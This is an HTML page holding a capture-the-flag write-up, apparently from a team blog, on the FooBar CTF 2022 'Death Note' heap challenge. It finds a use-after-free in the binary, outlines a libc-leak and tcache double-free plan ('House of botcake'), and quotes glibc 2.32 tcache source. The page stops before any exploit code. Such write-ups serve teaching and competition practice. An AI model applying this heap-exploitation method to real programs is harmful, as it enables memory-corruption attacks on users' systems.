<!DOCTYPE html><html lang="en" class="scroll-smooth"><head><link rel="apple-touch-icon" sizes="76x76" href="/static/favicons/apple-touch-icon.png?v=2"/><link rel="icon" type="image/png" sizes="32x32" href="/static/favicons/favicon-32x32.png?v=2"/><link rel="icon" type="image/png" sizes="16x16" href="/static/favicons/favicon-16x16.png?v=2"/><link rel="manifest" href="/static/favicons/site.webmanifest?v=2"/><link rel="mask-icon" href="/static/favicons/safari-pinned-tab.svg?v=2" color="#5bbad5"/><meta name="msapplication-TileColor" content="#da532c"/><meta name="theme-color" content="#ffffff"/><link rel="alternate" type="application/rss+xml" href="/feed.xml"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css" integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><meta charSet="utf-8"/><script>!function(){try {var d=document.documentElement.classList;d.remove('light','dark');var e=localStorage.getItem('theme');d.add('dark');if("system"===e||(!e&&false)){var t="(prefers-color-scheme: dark)",m=window.matchMedia(t);m.media!==t||m.matches?d.add('dark'):d.add('light')}else if(e) d.add(e)}catch(e){}}()</script><meta content="width=device-width, initial-scale=1" name="viewport"/><title>FooBar CTF 2022 – Death Note</title><meta name="robots" content="follow, index"/><meta name="description" content="A classic heap challenge in FooBar."/><meta property="og:url" content="https://sekai.team/blog/foobar-ctf-2022/death-note/"/><meta property="og:type" content="article"/><meta property="og:site_name" content="Project SEKAI"/><meta property="og:description" content="A classic heap challenge in FooBar."/><meta property="og:title" content="FooBar CTF 2022 – Death Note"/><meta property="og:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=FooBar+CTF+2022+%E2%80%93+Death+Note&amp;desc=A+classic+heap+challenge+in+FooBar.&amp;authors=Johnathan"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="https://twitter.com/ProjectSEKAIctf"/><meta name="twitter:title" content="FooBar CTF 2022 – Death Note"/><meta name="twitter:description" content="A classic heap challenge in FooBar."/><meta name="twitter:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=FooBar+CTF+2022+%E2%80%93+Death+Note&amp;desc=A+classic+heap+challenge+in+FooBar.&amp;authors=Johnathan"/><meta property="article:published_time" content="2022-03-08T00:00:00.000Z"/><link rel="canonical" href="https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/FooBar-CTF-2022/Death-note"/><link rel="canonical" href="https://sekai.team/blog/foobar-ctf-2022/death-note/"/><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://sekai.team/blog/foobar-ctf-2022/death-note"
  },
  "headline": "FooBar CTF 2022 – Death Note",
  "image": [
    {
      "@type": "ImageObject",
      "url": "https://og-vercel-ruby.vercel.app/api/sekai?title=FooBar+CTF+2022+%E2%80%93+Death+Note&desc=A+classic+heap+challenge+in+FooBar.&authors=Johnathan"
    }
  ],
  "datePublished": "2022-03-08T00:00:00.000Z",
  "dateModified": "2022-03-08T00:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Johnathan"
    }
  ],
  "publisher": {
    "@type": "Organization",
    "name": "Project SEKAI",
    "logo": {
      "@type": "ImageObject",
      "url": "https://sekai.team/static/images/fullLogo.svg"
    }
  },
  "description": "A classic heap challenge in FooBar."
}</script><meta name="next-head-count" content="21"/><link rel="preload" href="/_next/static/css/206f24680f6266ec.css" as="style"/><link rel="stylesheet" href="/_next/static/css/206f24680f6266ec.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-09a75c9ee2bd415e.js" defer=""></script><script src="/_next/static/chunks/main-b8c3e234d7065a2c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-b8cbc7cb85baf88e.js" defer=""></script><script src="/_next/static/chunks/framework-327e104994690a53.js" defer=""></script><script src="/_next/static/chunks/29107295-a2d0c8e72019a3ed.js" defer=""></script><script src="/_next/static/chunks/545-f1dc6b53ce85b08b.js" defer=""></script><script src="/_next/static/chunks/930-1296a6163e1e3cc6.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...slug%5D-9a47024c9df525b8.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_buildManifest.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_ssgManifest.js" defer=""></script><script src="/_next/static/qjVMIloeGVfOBGlHlZkTe/_middlewareManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap">@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuLyfMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuGKYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuFuYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body class="antialiased text-black bg-white dark:bg-gray-900 dark:text-white"><div id="__next" data-reactroot=""><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><div class="flex flex-col justify-between h-screen"><header class="flex items-center justify-between py-10"><div><a aria-label="Visit home page" href="/"><div class="flex items-center justify-between"><div class="mr-3"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 468.7 215.63" height="80" width="auto"><defs><linearGradient id="fullLogo_svg__linear-gradient" x1="-7051.74" y1="5608.42" x2="-7051.74" y2="5392.1" gradientTransform="matrix(1 0 .15 -.99 6503.98 5547.9)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#00e5ea"></stop><stop offset="1" stop-color="#00b5cc"></stop></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-2" x1="1498.32" y1="4428.84" x2="1497.92" y2="4311.82" gradientTransform="matrix(1 0 0 -1 -1107.01 4435.41)" xlink:href="#fullLogo_svg__linear-gradient"></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-3" x1="320.76" y1="14.17" x2="320.76" y2="47.97" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#0069a5"></stop><stop offset="1" stop-color="#003d6b"></stop></linearGradient><style>.fullLogo_svg__cls-1{fill:#fff}</style></defs><g id="fullLogo_svg__Project_SEKAI_Wide_White" data-name="Project SEKAI Wide White"><path class="fullLogo_svg__cls-1" d="M107 117.14v-4c11.93 0 22.15-8.62 23.76-20l12.91-91.63h4.06l-13 92.14c-1.92 13.4-13.84 23.49-27.73 23.49Z"></path><path class="fullLogo_svg__cls-1" d="M97.43 98.3a16 16 0 0 1-16.26-18.72l8.68-61.42A21.78 21.78 0 0 1 110.77 0a16.34 16.34 0 0 1 12.57 5.5A16.36 16.36 0 0 1 127 18.72l-8.69 61.42c-1.39 10.01-10.77 18.16-20.88 18.16ZM110.77 4a17.63 17.63 0 0 0-17 14.72l-8.64 61.42a12 12 0 0 0 12.3 14.16 17.65 17.65 0 0 0 16.95-14.72l8.69-61.42a12.41 12.41 0 0 0-2.75-10A12.4 12.4 0 0 0 110.77 4ZM186.94 5.42l.56-3.91H162.99l-13.5 95.44H174l.57-4h-20.46l5.85-41.36h20.46l.56-4h-20.45l5.96-42.17h20.45zM266.73 1.51h-31.01l-.55 3.91h14.2l-12.95 91.53h4.06l12.93-91.53h12.77l.55-3.91zM212.61 1.51a15.86 15.86 0 0 0-15.24 13.24l-9.86 69.48a11.69 11.69 0 0 0 2.76 9.34 12.57 12.57 0 0 0 9.18 4.43h.2c6.38 0 11.65-5.57 15.15-9.28L211.9 86c-3.06 3.23-7.67 8.11-12.38 8a8.54 8.54 0 0 1-6.21-3 7.73 7.73 0 0 1-1.84-6.18l9.86-69.48a11.83 11.83 0 0 1 11.28-9.9h13.91l.55-3.91ZM37.08 5.58a12 12 0 0 0-9.26-4.06H13.5L0 97h4.06l6.41-45.37h10.84a15.87 15.87 0 0 0 15.24-13.29l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.26 23a11.74 11.74 0 0 1-11.27 9.8H11l6-42.13h10.85a7.94 7.94 0 0 1 8 9.33ZM75.09 5.58a12 12 0 0 0-9.26-4.06h-14.3L38 97h4l6.5-45.42h10L65 96.2h4l-6.6-45a16 16 0 0 0 12.16-12.86l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.25 23a11.76 11.76 0 0 1-11.28 9.8H49.07L55 5.42h10.86a7.94 7.94 0 0 1 8 9.33ZM223.75 215.47h-4.06l13.5-95.43h4.05l-13.49 95.43zM65.83 215.63a14.49 14.49 0 0 1-11-4.65 11.3 11.3 0 0 1-2.68-9.15l1.31-8.59 4.4-2.34-1.76 11.52a7.24 7.24 0 0 0 1.75 5.93 10.47 10.47 0 0 0 8 3.28c6.42 0 12.26-4.39 13-9.8l5.42-38.33-28.77 15.27 6.37-46c1-7.3 8.65-13.24 17-13.24a14.52 14.52 0 0 1 11 4.65 11.36 11.36 0 0 1 2.68 9.14l-1.2 8.68-4.35 2.34 1.64-11.6a7.29 7.29 0 0 0-1.74-6 10.5 10.5 0 0 0-8-3.28c-6.42 0-12.26 4.39-13 9.79l-5.29 38.27 28.8-15.28-6.52 46.1c-1.11 7.35-8.73 13.29-17.06 13.29ZM174.15 120.04h-4.51l-26.9 51.72 7.31-51.72H146l-13.5 95.43h4.05l4.5-31.8 10.61-20.4 12.61 52.2h4.11l-13.91-57.6 19.68-37.83zM205 215.47h4l-2.29-94.87v-.56h-4l-29.31 95.43h4.18l9.82-32h16.83Zm-16.37-36L203 132.68l1.13 46.81ZM132.58 123.94l.56-3.91h-24.52l-13.49 95.44h24.51l.56-4H99.75l5.85-41.36h20.45l.57-4h-20.46l5.97-42.17h20.45z"></path><path style="fill:url(#fullLogo_svg__linear-gradient)" d="M279.69 1.51h8.87l-32.09 213.93h-8.87L279.69 1.51z"></path><path d="M393.81 14.88C396 .34 331.4 1.5 296.53 1.5L283.6 87.67c33.36-1.94 99.5-2 97.21 13.27-1.14 7.58-5.53 7.29-6.1 11.08-1.52 10.14 70.94 5.62 81.15 4.52L434 73.6l34.7-43.29c-17.47 1.81-82.47 4.94-81.11-4.15.73-4.87 5.41-5.56 6.22-11.28Z" style="fill:url(#fullLogo_svg__linear-gradient-2)"></path><path d="m324.34 13-5.8 25.24A9.73 9.73 0 0 0 312 36c-4.66 0-8.43 2.82-8.42 6.27s3.8 6.24 8.46 6.22c4 0 7.4-2.12 8.23-4.92 0-.14.06-.28.09-.42l3.48-15.5q9.18 2.06 9.72 5.26a9 9 0 0 1-1.27 6.22 10.78 10.78 0 0 0 5.7-8.81q.48-5.88-13.65-17.32Z" style="fill:url(#fullLogo_svg__linear-gradient-3)"></path></g></svg></div></div></a></div><div class="flex items-center text-base leading-5"><div class="hidden sm:block"><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/members/">Members</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/contests/">Contests</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/blog/">Blog</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/tags/">Tags</a><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100">CTF 2023</a></div><div class="sm:hidden"><button type="button" class="w-8 h-8 py-1 ml-1 mr-1 rounded" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg></button><div class="fixed w-full h-full top-24 right-0 bg-gray-200 dark:bg-gray-800 opacity-95 z-10 transform ease-in-out duration-300 translate-x-full"><button type="button" aria-label="toggle modal" class="fixed w-full h-full cursor-auto focus:outline-none"></button><nav class="fixed h-full mt-8"><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/members/">Members</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/contests/">Contests</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/blog/">Blog</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/tags/">Tags</a></div><div class="px-12 py-4"><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100">CTF 2023</a></div></nav></div></div></div></header><main class="mb-auto"><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><article><div class="xl:divide-y xl:divide-gray-200 xl:dark:divide-gray-700"><header class="pt-6 xl:pb-6"><div class="space-y-1 text-center"><dl class="space-y-10"><div><dt class="sr-only">Published on</dt><dd class="text-base font-medium leading-6 text-gray-500 dark:text-gray-400"><time dateTime="2022-03-08T00:00:00.000Z">Tuesday, 8 March 2022</time></dd></div></dl><div><h1 class="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14">FooBar CTF 2022 – Death Note</h1></div></div></header><div class="pb-8 divide-y divide-gray-200 xl:divide-y-0 dark:divide-gray-700 xl:grid xl:grid-cols-4 xl:gap-x-6" style="grid-template-rows:auto 1fr"><dl class="pt-6 pb-10 xl:pt-11 xl:border-b xl:border-gray-200 xl:dark:border-gray-700"><dt class="sr-only">Authors</dt><dd><ul class="flex justify-center space-x-8 xl:block sm:space-x-12 xl:space-x-0 xl:space-y-8"><li class="flex items-center space-x-2"><img src="https://www.gravatar.com/avatar/aa9cc3f27f3b1f3c47841d62f18c039f?d=identicon&amp;s=256" width="38px" height="38px" alt="avatar" class="w-10 h-10 rounded-full"/><dl class="text-sm font-medium leading-5 whitespace-nowrap"><dt class="sr-only">Name</dt><dd class="text-gray-900 dark:text-gray-100">Johnathan</dd><dt class="sr-only">Twitter</dt><dd><a target="_blank" rel="noopener noreferrer" href="https://github.com/nhtri2003gmail" class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400">@nhtri2003gmail</a></dd></dl></li></ul></dd></dl><div class="divide-y divide-gray-200 dark:divide-gray-700 xl:pb-0 xl:col-span-3 xl:row-span-2"><div class="pt-10 pb-8 prose dark:prose-dark max-w-none"><h2 id="foobarctf---death-note"><a href="#foobarctf---death-note" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>FoobarCTF - Death Note</h2>
<p>You can download challenge file in repo: <a target="_blank" rel="noopener noreferrer" href="https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/FooBar-CTF-2022/Death-note/dist.zip">dist.zip</a></p>
<p>There will be several files in zip as below:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">__MACOSX
</span><span class="code-line">__MACOSX/dist
</span><span class="code-line">dist
</span><span class="code-line">dist/dnote
</span><span class="code-line">dist/ld-2.32.so
</span><span class="code-line">dist/libc-2.32.so
</span></code></pre></div>
<p>Download and extract, then use <code>pwninit</code> to patch file. And now, let’s start!</p>
<h2 id="1-find-bug"><a href="#1-find-bug" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>1. Find bug</h2>
<p>First, we will use <code>file</code> to check for basic information:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">$ <span class="token function">file</span> dnote
</span><span class="code-line">dnote: ELF <span class="token number">64</span>-bit LSB executable, x86-64, version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>8980c2c36d828a8b8434c28e64dd0cf4777fd7cf, <span class="token keyword">for</span> GNU/Linux <span class="token number">3.2</span>.0, not stripped
</span></code></pre></div>
<p>This is a 64-bit file without being stripped. Next, we will use <code>checksec</code> to check for all defences of file:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">$ checksec dnote
</span><span class="code-line">    Arch:     amd64-64-little
</span><span class="code-line">    RELRO:    Partial RELRO
</span><span class="code-line">    Stack:    No canary found
</span><span class="code-line">    NX:       NX enabled
</span><span class="code-line">    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</span></code></pre></div>
<p>Well, we can see that just <code>NX enabled</code>. Finally, we will use ghidra to decompile the challenge file to understand how the program work. There will be several function and we will go through all of them.</p>
<p>First is the <code>main()</code> function. We can see that there are 3 subfunction: <code>Add Page</code>, <code>Show Page</code> and <code>Delete Page</code>.</p>
<p>With the first option <code>Add Page</code>, we can add up to 20 chunk with number from 0 to 20, then malloc() with the size we want because there is no check for the size. After that, we will input data to the chuck with <code>fgets()</code>:</p>
<p><img src="/static/images/foobar-ctf-2022/images/add_page.png" alt="add_page.png"/></p>
<p>The second option is <code>Show Page</code>, which first check if the pointer to chunk is removed or exist in global var <code>note</code>. If exist, print data of that chunk out with <code>puts()</code> (<code>puts()</code> will end at null byte).</p>
<p><img src="/static/images/foobar-ctf-2022/images/show_page.png" alt="show_page.png"/></p>
<p>And the last option is <code>Delete Page</code> and we don’t have any option to edit the chunk. The function first check if the pointer to chunk is exist or not. If exist, free() it without removing the pointer to chunk → <strong>Use After Free</strong></p>
<p><img src="/static/images/foobar-ctf-2022/images/delete_page.png" alt="delete_page.png"/></p>
<p>And that’s all bug we can found. Let’s move on the next part: Brainstorming!</p>
<h2 id="2-brainstorming"><a href="#2-brainstorming" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>2. Brainstorming</h2>
<p>If you’re not familiar with heap, please read <a target="_blank" rel="noopener noreferrer" href="https://guyinatuxedo.github.io/25-heap/index.html">here</a> to have a general view about all kinds of chunk.</p>
<p>First, we will need to leak the main arena address by freeing a large chunk and make it go to large bin (if goes to unsorted bin, it will have null byte at LSB). When we have the libc address, we will need to do a <strong>Tcache attack</strong>.</p>
<p>So let’s search for available technique to attack lib 2.32 <a target="_blank" rel="noopener noreferrer" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.32">here</a> and we can see that there is a technique called <a target="_blank" rel="noopener noreferrer" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_botcake.c">House of botcake</a> will help us double free and overlap chunk. With this, we can overwrite the forward pointer to any address we want.</p>
<p>One thing to notice is that on libc 2.32, the <a target="_blank" rel="noopener noreferrer" href="https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L2928">tcache</a> changed its act with a simple XOR was added to it:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">/* Caller must ensure that we know tc_idx is valid and there’s room
</span><span class="code-line">   for more chunks.  */
</span><span class="code-line">static __always_inline void
</span><span class="code-line">tcache_put (mchunkptr chunk, size_t tc_idx)
</span><span class="code-line">{
</span><span class="code-line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
</span><span class="code-line">
</span><span class="code-line">  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will
</span><span class="code-line">     detect a double free.  */
</span><span class="code-line">  e-&gt;key = tcache;
</span><span class="code-line">
</span><span class="code-line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);
</span><span class="code-line">  tcache-&gt;entries[tc_idx] = e;
</span><span class="code-line">  ++(tcache-&gt;counts[tc_idx]);
</span><span class="code-line">}
</span><span class="code-line">
</span><span class="code-line">/* Caller must ensure that we know tc_idx is valid and there’s
</span><span class="code-line">   available chunks to remove.  */
</span><span class="code-line">static __always_inline void *
</span><span class="code-line">tcache_get (size_t tc_idx)
</span><span class="code-line">{
</span><span class="code-line">  tcache_entry *e = tcache-&gt;entries[tc_idx];
</span><span class="code-line">  if (__glibc_unlikely (!aligned_OK (e)))
</span><span class="code-line">    malloc_printerr (&quot;malloc(): unaligned tcache chunk detected&quot;);
</span><span class="code-line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);
</span><span class="code-line">  --(tcache-&gt;counts[tc_idx]);
</span><span class="code-line">  e-&gt;key = NULL;
</span><span class="code-line">  return (void *) e;
</span><span class="code-line">}
</span></code></pre></div>
<p>Two new macros are added to protect the chunk when storing and fetching a chunk which is linked to an old chunk in tcache (which means when we free a chunk and it goes to tcache, the forward pointer will be XOR first and then write to that chunk).</p>
<p>At line 12 and 25, there is a function called <code>PROTECT_PTR</code> and <code>REVEAL_PTR</code> which is new in libc 2.32. These functions are defined in the <a target="_blank" rel="noopener noreferrer" href="https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L341">source</a> as follows:</p>
